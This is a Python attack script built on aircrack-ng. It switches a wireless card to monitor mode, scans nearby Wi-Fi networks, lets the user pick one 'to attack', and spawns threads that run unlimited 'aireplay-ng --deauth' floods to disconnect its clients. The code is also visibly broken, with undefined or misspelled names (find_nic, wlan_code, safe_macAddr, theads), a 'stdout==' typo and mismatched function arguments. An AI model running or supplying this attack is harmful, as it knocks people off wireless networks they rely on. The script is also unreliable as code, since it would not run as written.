#!/usr/bin/python3
#!/usr/bin/env python3

import csv
import os
import re
import shutil
import subprocess
import threading
import time

from datetime import datetime

# make sure user pipruns with sudo
def check_sudo():
    if not "SUDO_UID" in os.environ.keys():
        print("(-) Run with sudo")
        exit()

# Moves all csv files in the directory to a new backup location
def create_backup():
    for file in os.listdir():
        if ".csv" in file:
            print("Found .csv files in directory")
            directory = os.getcwd()
            try:
                # make a backup directory
                os.mkdir(directory + "/backup/")
            except:
                print("Already exists")
            # Create a timestamp
            timestamp = datetime.now()
            # copy .csv files in directory to the backup location
            shutil.move(file, directory + "/backup/" + str(timestamp) + "-" + file)

# find the network interfaces
def get_nic():
    result = subprocess.run(["iw", "dev"], capture_output=True).stdout.decode()
    nic = wlan_code.findall(result)
    return nic

def get_clients(bssid, channel, essid, wifi_name):
    subprocess.Popen(["airodump-ng", "--bssid", bssid, "--channel", channel, "--essid", essid, "-w", "clients", "--write-interval", "1", "--output-format", "csv", wifi_name], stdout==subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
# set nic to monitor mode
def set_monitor_mode(con_name):
    # take WiFi controller down
    subprocess.run(["ip", "link", "set", wifi_name, "down"]) 
    # kills conflicting processes
    subprocess.run(["airmon-ng", "check", "kill"])
    # set nic to monitor mode
    subprocess.run(["iw", wifi_name, "set", "monitor", "none"])
    # bring WiFi controller back online
    subprocess.run(["ip", "link", "set", wifi_name, "up"])

# change from monitor mode to managed mode
def set_managed_mode(wifi_name):
    # take WiFi controller down
    subprocess.run(["ip", "link", "set", wifi_name, "down"]) 
    # set nic to monitor mode
    subprocess.run(["iw", wifi_name, "set", "managed", "none"])
    # bring WiFi controller back online
    subprocess.run(["ip", "link", "set", wifi_name, "up"])
    # start network manager service
    subprocess.run(["service", "NetworkManager", "start"])

# set monitor band
def start_monitor():
    # Checks 2.4Ghz and 5Ghz bands
    subprocess.run(["airodump-ng", "--band", "abg", "-w", "file", "--write-interval", "1", "--output-format", "csv", wifi_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# checks if there is an ESSID in the list
def check_for_essid(essid, lst):
    status = True

    # if no ESSIDs in list add the row
    if len(lst) == 0:
        return status
    
    # only runs if there are WAPs in the list
    for item in lst:
        # True = don't add to list, False = add to list
        if essid in item["ESSID"]:
            status = False
    
    return status

def show_WAPs():
    active_wireless_networks= list()
    try:
        while True:
            # clear screen
            subprocess.call("clear", shell=True)
            for file in os.listdir():
                # should only have one csv file, rest should be in backup location
                # following list contains the field names for the csv entries
                fieldnames = ('BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key')
                if ".csv" in file:
                    with open(file) as csv_h:
                        # use DictReader method take csv_h contents and apply the dict with the fieldnames
                        # creates a list of dictionaries with the keys as specified in the fieldnames
                        csv_h.seek(0)
                        csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                        for r in csv_reader:
                            if r["BSSID"] == "BSSID":
                                pass
                            elif r["BSSID"] == "Station MAC":
                                break
                            elif check_for_essid(essid=r["ESSID"], lst=active_wireless_networks):
                                active_wireless_networks.append(r)
            print("Scanning... Press Ctrl+C to select which wireless network to attack\n")
            print("No |\tBSSID          |\tChannel|\tESSID              |")
            print("___|\t_______________|\t_______|\t___________________|")
            for index, item in enumerate(active_wireless_networks):
                print(f"{index}\t{item['BSSID']}\t{item['Channel'].strip()}\t\t{item['ESSID']}")
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n(-) Ready to make choice...")

    while True:
        choice = input("Select a choice from above: ")
        if active_wireless_networks[int(choice)]:
            return active_wireless_networks[int(choice)]
        print("(-) Invalid, try again...")


def deauth(targ_ssid, interface):
    subprocess.Popen(["aireplay-ng", "--deauth", "0", "-e", targ_ssid, interface])

# regex stuff
#macAddr_regex = re.compile(r'(?:[0-9a-fA-F]:?){12}')
wlan = re.compile("Interface (wlan[0-9]+)")

# check for sudo and create backup
check_sudo()
create_backup()

# mac addresses to leave alone
safe_essid = list()

while True:
    essid_csv = input("Enter the file path containing the ESSIDs you don't want to attack: ")

    with open(essid_csv, "r+") as file:
        safe_essid.append(file.read())

    if len(safe_essid) > 0:
        break

    print("(-) Invalid essids")

    #safe_macAddr = macAddr_regex.findall(macs)
    #safe_macAddr = [mac.upper() for mac in safe_macAddr]

    #if len(safe_macAddr) > 0:
    #    break
    #print("(-) Invalid Mac Address(es)")

netw_con = find_nic()
if len(netw_con) == 0:
    print("(-) conect a NIC and try again...")
    exit()

while True:
    for index, con in enumerate(netw_con):
        print(f"{index} - {con}")

    con_choice = input("Select the controller you want to put into monitor mode: ")

    try:
        if netw_con[int(con_choice)]:
            break
    except:
        print("(-) Invalid selection...")

# Assign NIC name to a variable
wifi_name = netw_con[int(con_choice)]

#set NIC to monitor mode
set_monitor_mode(con_name=wifi_name)
# Monitor 2.4Ghz & 5Ghz
start_monitor()

# Print menu
wifi_netw_choice = show_WAPs()
bssid = wifi_netw_choice["BSSID"]
essid = wifi_netw_choice["ESSID"]
# strip out all extra white space
channel = wifi_netw_choice["channel"].strip()
# run only against network we want to kick clients off
get_clients(bssid=bssid, channel=channel, essid=essid, wifi_name=wifi_name)

# set can only hold unique values
active_clients = set()
# keep track of threads
threads = []

subprocess.run(["airmon-ng", "start", wifi_name, channel])
try:
    while True:
        count = 0

        # clear screen
        subprocess.call("clear", shell=True)
        for file in os.listdir():
            fieldnames = ("Station MAC", "First time seen", "Last time seen", "Power", "packets", "BSSID", "Probed ESSIDs")
            if ".csv" in file and file.startswith("clients"):
                with open(file) as csv_h:
                    print("Running...")
                    csv_h.seek(0)
                    csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                    for index, r in enumerate(csv_reader):
                        if index < 5:
                            pass
                        # won't add MAC address(es) we specified at the beginning
                        elif r["Station MAC"] in safe_macAddr:
                            pass
                        else:
                            # add all the active MAC addresses
                            active_clients.add(r["Probed ESSIDs"])
            print("Probed ESSIDs          |")
            print("_______________________|")
            for item in active_clients:
                print(f"{item}")
                if item not in threads:
                    theads.append(item)
                    t = threading.Thread(target=deauth, args=[essid, item, wifi_name], daemon=True)
                    t.start()
except KeyboardInterrupt:
    print("\nStopping Deauth...")

set_managed_mode(wifi_name)
